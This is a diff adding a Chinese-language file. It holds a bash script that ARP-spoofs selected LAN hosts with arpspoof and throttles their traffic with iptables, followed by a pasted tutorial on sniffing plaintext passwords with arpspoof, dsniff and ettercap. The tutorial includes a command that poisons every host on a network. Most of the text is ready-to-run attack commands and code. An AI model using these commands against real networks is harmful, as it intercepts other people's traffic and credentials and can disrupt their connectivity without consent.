@@ -1,0 +1,67 @@
+#1）sudo apt-get install dsniff nmap
+
+#2）探测局域网主机的ip地址
+
+#sudo nmap -sS 网关ip/24
+
+#在此例中：
+
+#192.168.1.100           为要限速的主机
+
+#192.168.1.1                为网关地址
+
+#3）打开 内核的 IP 转发，让我们的主机成为路由器
+#echo 1 > /proc/sys/net/ipv4/ip_forward 
+
+#4）使用 iptables和arpspoof进行 限速！ 脚本如下
+#使用方式：
+#sudo  ./iptable.sh  要限的速度（30为40k/s） 网关ip  限速主机1  限速主机2
+
+
+#!/bin/bash
+if [ $# -le 2 ]
+then
+    echo "Usage: ./iptables.sh speed gateway ip1 ip2 ...."
+    exit -1
+else
+    speed=$1
+    gateway=$2
+fi
+IPT=/sbin/iptables
+
+while [ $# -gt 2 ]
+do
+    shift
+    echo $gateway,$2
+    #arpspoof -i eth0 -t $2 $gateway&
+    #arpspoof -i eth0 -t $gateway $2&
+	arpspoof -i wlan0 -t $2 $gateway&
+	arpspoof -i wlan0 -t $gateway $2&
+
+    $IPT -A FORWARD -s $2  -m limit --limit ${speed}/s -j ACCEPT
+
+    $IPT -A FORWARD -d $2  -m limit --limit ${speed}/s -j ACCEPT
+
+    $IPT -A FORWARD -s $2  -j DROP
+
+    $IPT -A FORWARD -d $2  -j DROP
+
+done
+
+使用Dsniff和Ettercap快速演示ARP欺骗
+　　让我们从Dug Song的、支持Dsniff的ARPspoof程序开始吧。我使用的Unix版本，但是你可以找到Win32版本的。运行Dsniff最简单的方法就是从恢复启动CD启动。首先你应该确定包转发已经开启，不然我们的机器会丢弃所有我们想要嗅探的主机之间的传输，导致服务无响应。我用的一些工具会自动进行这项工作(比如Ettercap)，但是保险起见，你也许会希望自己来做这件事。根据操作系统的不同，你可以使用如下的命令：
+　　Linux：
+　　echo 1 > /proc/sys/net/ipv4/ip_forward
+　　BSD：
+　　sysctl -w net.inet.ip.forwarding=1
+　　现在你的计算机将把转发所有的传输，现在你可以开始ARP欺骗了。我们假设你想要嗅探一个主机和网关之间的所有传输，这样你就可以看到它发送到网络上的所有数据。如果想要获得双向的所有传输，你应当使用如下2个命令行：
+　　arpspoof -t 192.168.1.1 192.168.1.2 & >/dev/null
+　　arpspoof -t 192.168.1.2 192.168.1.1 & >/dev/null
+　　“& >/dev/nul”部分是为了使它在终端运行起来更容易，但是为了debug，你可能想要忽略它。现在你可以使用你想要的任何套件来嗅探连接。新手的话，我推荐使用Dsniff，它支持ARPspoof来嗅探纯文本密码。用Dsniff开始嗅探，你只需退出到命令窗口并输入：
+　　dsniff
+　　Dsniff找到用户名和密码后，它会将它们显示在屏幕上。如果你想要查看所有其他传输，我推荐你使用TCPDump或者 Wireshark。如果想要停止ARP欺骗，输入如下命令：
+　　killall arpspoof
+　　这会关闭上面启动的2个Arpspoof。
+　　另一个很棒的工具是Ettercap，它相当于ARP病毒和密码嗅探界的瑞士军刀。我通常在非互动模式中使用它，但是默认情况下它的交互界面非常友好，使用起来很方便。如果你想要使用Ettercap来进行ARP病毒，你可以使用下面示范的命令例句。如果我们的目标是网络上的所有主机，想要嗅探每个节点之间的所有传输，我们可以用下列命令：
+　　ettercap -T -q -M ARP // //
+　　你应当谨慎的使用上面那段命令，因为如果把一个大网络中所有的传输都通过一台很慢的计算机的话，那么这很有可能使整个网络连接瘫痪。
